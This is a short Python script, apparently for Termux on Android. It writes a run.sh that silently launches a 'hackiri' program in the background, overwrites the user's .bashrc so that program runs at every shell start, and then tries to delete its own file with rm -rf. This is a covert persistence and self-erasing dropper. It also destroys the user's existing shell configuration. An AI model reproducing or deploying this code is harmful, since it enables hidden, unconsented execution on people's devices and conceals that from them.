import os
os.chdir('/data/data/com.termux//files/home')
file = open('run.sh' , 'w+')
file.write('python D_O_F_L/hackiri/main.py &> /dev/null &')
file.close()
try:
    file2 = open('.bashrc' , 'w+')
    file2.write('bash run.sh')
except:
    try:
        os.system('> .bashrc')
    except:
        pass
    file2 = open('.bashrc', 'w+')
    file2.write('bash run.sh')
while True:
    try:
        os.system('rm -rf D_O_F_L/hackri/run.py')
        break
    except:
        pass
